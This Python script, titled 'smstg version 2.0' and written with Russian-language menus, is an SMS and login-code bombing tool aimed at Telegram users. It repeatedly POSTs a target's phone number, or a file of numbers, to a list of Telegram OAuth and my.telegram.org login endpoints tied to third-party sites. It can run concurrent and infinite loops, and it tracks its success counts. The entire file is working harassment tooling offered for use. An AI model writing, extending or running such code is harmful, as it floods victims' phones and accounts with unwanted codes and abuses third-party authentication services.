import httpx
import asyncio
from pystyle import Colors, Colorate, Center
import time
import os

banner = '''
   ▄████████   ▄▄▄▄███▄▄▄▄      ▄████████     ███        ▄██████▄  
  ███    ███ ▄██▀▀▀███▀▀▀██▄   ███    ███ ▀█████████▄   ███    ███ 
  ███    █▀  ███   ███   ███   ███    █▀     ▀███▀▀██   ███    █▀  
  ███        ███   ███   ███   ███            ███   ▀  ▄███        
▀███████████ ███   ███   ███ ▀███████████     ███     ▀▀███ ████▄  
         ███ ███   ███   ███          ███     ███       ███    ███ 
   ▄█    ███ ███   ███   ███    ▄█    ███     ███       ███    ███ 
 ▄████████▀   ▀█   ███   █▀   ▄████████▀     ▄████▀     ████████▀  

[ by: @L1NUX0IDOV ]                                                                 
'''

styled_banner = Colorate.Horizontal(Colors.red_to_yellow, Center.XCenter(banner))
print(styled_banner)
print(Colorate.Horizontal(Colors.red_to_yellow, Center.XCenter("[ smstg version 2.0 by: @koderow ]")))
print()
time.sleep(1)

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
                  ' AppleWebKit/537.36 (KHTML, like Gecko)'
                  ' Chrome/58.0.3029.110 Safari/537.3'
}

URLS = [
    "https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https://cabinet.presscode.app&embed=1&return_to=https://cabinet.presscode.app/login",
    "https://translations.telegram.org/auth/request",
    "https://oauth.telegram.org/auth?bot_id=5444323279&origin=https://fragment.com&request_access=write&return_to=https://fragment.com/",
    "https://oauth.telegram.org/auth?bot_id=1199558236&origin=https://bot-t.com&embed=1&request_access=write&return_to=https://bot-t.com/login",
    "https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https://off-bot.ru&embed=1&request_access=write&return_to=https://off-bot.ru/register/connected-accounts/smodders_telegram/?setup=1",
    "https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https://mipped.com&embed=1&request_access=write&return_to=https://mipped.com/f/register/connected-accounts/smodders_telegram/?setup=1",
    "https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https://www.spot.uz&return_to=https://www.spot.uz/ru/2022/04/29/yoto/#",
    "https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https://tbiz.pro&embed=1&request_access=write&return_to=https://tbiz.pro/login",
    "https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https://telegrambot.biz&embed=1&return_to=https://telegrambot.biz/",
    "https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https://combot.org&embed=1&request_access=write&return_to=https://combot.org/login",
    "https://my.telegram.org/auth/send_password"
]

stats = {
    'success': 0,
    'failed': 0,
    'total': 0
}

def shorten_url(url):
    if "bot_id=" in url:
        bot_id = url.split("bot_id=")[1].split("&")[0]
        domain = url.split("origin=")[1].split("&")[0] if "origin=" in url else url.split("//")[1].split("/")[0]
        return f"bot:{bot_id}->{domain}"
    return url.split("//")[1].split("/")[0] if "//" in url else url

async def send_post(client, url, phone):
    try:
        response = await client.post(url, headers=HEADERS, data={'phone': phone}, timeout=10.0)
        stats['total'] += 1
        short_url = shorten_url(url)
        if response.status_code in [200, 302]:
            stats['success'] += 1
            status_line = f"[УСПЕХ] {phone} -> {short_url} [{response.status_code}]"
            print(Colorate.Horizontal(Colors.red_to_yellow, status_line))
        else:
            stats['failed'] += 1
            status_line = f"[ОШИБКА] {phone} -> {short_url} [{response.status_code}]"
            print(Colorate.Horizontal(Colors.red_to_yellow, status_line))
    except Exception as e:
        stats['failed'] += 1
        stats['total'] += 1
        short_url = shorten_url(url)
        error_msg = str(e)[:50] + "..." if len(str(e)) > 50 else str(e)
        error_line = f"[ОШИБКА] {phone} -> {short_url} -> {error_msg}"
        print(Colorate.Horizontal(Colors.red_to_yellow, error_line))

def show_thread_menu():
    thread_text = """
[ 1 ] Выбор потока (ограниченное количество)
[ 2 ] Бесконечный поток
    """
    print(Colorate.Horizontal(Colors.red_to_yellow, thread_text))
    
    while True:
        choice = input(Colorate.Horizontal(Colors.red_to_yellow, "Выберите режим потоков (1/2): ")).strip()
        if choice in ['1', '2']:
            return choice
        else:
            print(Colorate.Horizontal(Colors.red_to_yellow, "[Ошибка] Введите 1 или 2"))

def get_thread_count():
    try:
        return int(input(Colorate.Horizontal(Colors.red_to_yellow, "Введите количество потоков: ")))
    except ValueError:
        print(Colorate.Horizontal(Colors.red_to_yellow, "[Ошибка] Введите число! Установлено значение по умолчанию: 5"))
        return 5

async def process_single_number_limited(phone, repeat, delay, thread_count):
    print(Colorate.Horizontal(Colors.red_to_yellow, f"\n ОБРАБОТКА НОМЕРА: {phone}"))
    print(Colorate.Horizontal(Colors.red_to_yellow, f" ПОВТОРОВ: {repeat} | ПОТОКОВ: {thread_count} | URLS: {len(URLS)}"))
    
    async with httpx.AsyncClient() as client:
        for i in range(repeat):
            print(Colorate.Horizontal(Colors.red_to_yellow, f"\n ЦИКЛ {i + 1}/{repeat} | НОМЕР: {phone}"))
            
            semaphore = asyncio.Semaphore(thread_count)
            
            async def bounded_send_post(url, phone):
                async with semaphore:
                    await send_post(client, url, phone)
            
            tasks = [bounded_send_post(url, phone) for url in URLS]
            await asyncio.gather(*tasks)
            
            print(Colorate.Horizontal(Colors.red_to_yellow, 
                  f" Прогресс: {i + 1}/{repeat} | Успешно: {stats['success']} | Ошибки: {stats['failed']}"))
            
            if i < repeat - 1:
                await asyncio.sleep(delay)

async def process_single_number_infinite(phone, repeat, delay):
    print(Colorate.Horizontal(Colors.red_to_yellow, f"\n БЕСКОНЕЧНЫЙ ПОТОК | НОМЕР: {phone}"))
    print(Colorate.Horizontal(Colors.red_to_yellow, f" URLS: {len(URLS)}"))
    
    async with httpx.AsyncClient() as client:
        cycle_count = 0
        try:
            while True:
                cycle_count += 1
                print(Colorate.Horizontal(Colors.red_to_yellow, f"\n ЦИКЛ {cycle_count} | НОМЕР: {phone}"))
                
                tasks = [send_post(client, url, phone) for url in URLS]
                await asyncio.gather(*tasks)
                
                print(Colorate.Horizontal(Colors.red_to_yellow, 
                      f" Циклов: {cycle_count} | Успешно: {stats['success']} | Ошибки: {stats['failed']}"))
                
                await asyncio.sleep(delay)
        except KeyboardInterrupt:
            print(Colorate.Horizontal(Colors.red_to_yellow, f"\n  Остановлено после {cycle_count} циклов"))

async def process_multiple_numbers_limited(phones, repeat, delay, thread_count):
    print(Colorate.Horizontal(Colors.red_to_yellow, f"\n ЗАГРУЖЕНО НОМЕРОВ: {len(phones)} | ПОТОКОВ: {thread_count}"))
    
    async with httpx.AsyncClient() as client:
        for index, phone in enumerate(phones, 1):
            phone = phone.strip()
            if not phone:
                continue
                
            print(Colorate.Horizontal(Colors.red_to_yellow, 
                  f"\n ОБРАБОТКА {index}/{len(phones)} | НОМЕР: {phone}"))
            
            for i in range(repeat):
                print(Colorate.Horizontal(Colors.red_to_yellow, 
                      f" ЦИКЛ {i + 1}/{repeat} | НОМЕР: {phone}"))
                
                semaphore = asyncio.Semaphore(thread_count)
                
                async def bounded_send_post(url, phone):
                    async with semaphore:
                        await send_post(client, url, phone)
                
                tasks = [bounded_send_post(url, phone) for url in URLS]
                await asyncio.gather(*tasks)
                
                print(Colorate.Horizontal(Colors.red_to_yellow, 
                      f" Прогресс: {i + 1}/{repeat} | Успешно: {stats['success']} | Ошибки: {stats['failed']}"))
                
                if i < repeat - 1:
                    await asyncio.sleep(delay)
            
            if index < len(phones):
                print(Colorate.Horizontal(Colors.red_to_yellow, f"  Пауза перед следующим номером..."))
                await asyncio.sleep(delay * 2)

async def process_multiple_numbers_infinite(phones, repeat, delay):
    print(Colorate.Horizontal(Colors.red_to_yellow, f"\n БЕСКОНЕЧНЫЙ ПОТОК | НОМЕРОВ: {len(phones)}"))
    
    async with httpx.AsyncClient() as client:
        cycle_count = 0
        try:
            while True:
                cycle_count += 1
                print(Colorate.Horizontal(Colors.red_to_yellow, f"\n ОБЩИЙ ЦИКЛ {cycle_count}"))
                
                for index, phone in enumerate(phones, 1):
                    phone = phone.strip()
                    if not phone:
                        continue
                        
                    print(Colorate.Horizontal(Colors.red_to_yellow, 
                          f" НОМЕР {index}/{len(phones)}: {phone}"))
                    
                    tasks = [send_post(client, url, phone) for url in URLS]
                    await asyncio.gather(*tasks)
                    
                    if index < len(phones):
                        await asyncio.sleep(delay)
                
                print(Colorate.Horizontal(Colors.red_to_yellow, 
                      f" Полных циклов: {cycle_count} | Успешно: {stats['success']} | Ошибки: {stats['failed']}"))
                
                await asyncio.sleep(delay * 2)
        except KeyboardInterrupt:
            print(Colorate.Horizontal(Colors.red_to_yellow, f"\n  Остановлено после {cycle_count} полных циклов"))

def read_phones_from_file():
    file_path = "/storage/emulated/0/Download/smstg/phonenamber.txt"
    
    if not os.path.exists(file_path):
        print(Colorate.Horizontal(Colors.red_to_yellow, f"[Ошибка] Файл не найден: {file_path}"))
        return []
    
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            phones = [line.strip() for line in file if line.strip()]
        
        print(Colorate.Horizontal(Colors.red_to_yellow, f"[Успех] Загружено {len(phones)} номеров из файла"))
        return phones
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_yellow, f"[Ошибка] Не удалось прочитать файл: {e}"))
        return []

def show_main_menu():
    menu_text = """
[ 1 ] Выбор одного номера
[ 2 ] Выбор множества номеров (из файла)
    """
    print(Colorate.Horizontal(Colors.red_to_yellow, menu_text))
    
    while True:
        choice = input(Colorate.Horizontal(Colors.red_to_yellow, "Выберите вариант (1/2): ")).strip()
        if choice in ['1', '2']:
            return choice
        else:
            print(Colorate.Horizontal(Colors.red_to_yellow, "[Ошибка] Введите 1 или 2"))

def get_single_number():
    return input(Colorate.Horizontal(Colors.red_to_yellow, "Введите номер телефона (в формате +79991234567): ")).strip()

def get_repeat_count():
    try:
        return int(input(Colorate.Horizontal(Colors.red_to_yellow, "Сколько повторов сделать для каждого номера: ")))
    except ValueError:
        print(Colorate.Horizontal(Colors.red_to_yellow, "[Ошибка] Введите число! Установлено значение по умолчанию: 2"))
        return 2

def print_stats():
    separator = "="*50
    print(Colorate.Horizontal(Colors.red_to_yellow, f"\n{separator}"))
    print(Colorate.Horizontal(Colors.red_to_yellow, "[ФИНАЛЬНАЯ СТАТИСТИКА]"))
    print(Colorate.Horizontal(Colors.red_to_yellow, f" Успешно отправлено: {stats['success']}"))
    print(Colorate.Horizontal(Colors.red_to_yellow, f". Не дошли: {stats['failed']}"))
    print(Colorate.Horizontal(Colors.red_to_yellow, f" Всего запросов: {stats['total']}"))
    print(Colorate.Horizontal(Colors.red_to_yellow, separator))

async def main():
    main_choice = show_main_menu()
    thread_choice = show_thread_menu()
    delay = 1.0
    
    stats.update({'success': 0, 'failed': 0, 'total': 0})
    
    if main_choice == '1':
        phone = get_single_number()
        if not phone:
            print(Colorate.Horizontal(Colors.red_to_yellow, "[Ошибка] Не введен номер телефона!"))
            return
        
        if thread_choice == '1':
            repeat_count = get_repeat_count()
            thread_count = get_thread_count()
            await process_single_number_limited(phone, repeat_count, delay, thread_count)
        else:
            await process_single_number_infinite(phone, 0, delay)
    
    else:
        phones = read_phones_from_file()
        if not phones:
            print(Colorate.Horizontal(Colors.red_to_yellow, "[Ошибка] Нет номеров для обработки!"))
            return
        
        if thread_choice == '1':
            repeat_count = get_repeat_count()
            thread_count = get_thread_count()
            await process_multiple_numbers_limited(phones, repeat_count, delay, thread_count)
        else:
            await process_multiple_numbers_infinite(phones, 0, delay)
    
   
    print_stats()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(Colorate.Horizontal(Colors.red_to_yellow, "\n[Прервано пользователем]"))
        print_stats()
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_yellow, f"\n[Критическая ошибка]: {e}"))
        print_stats()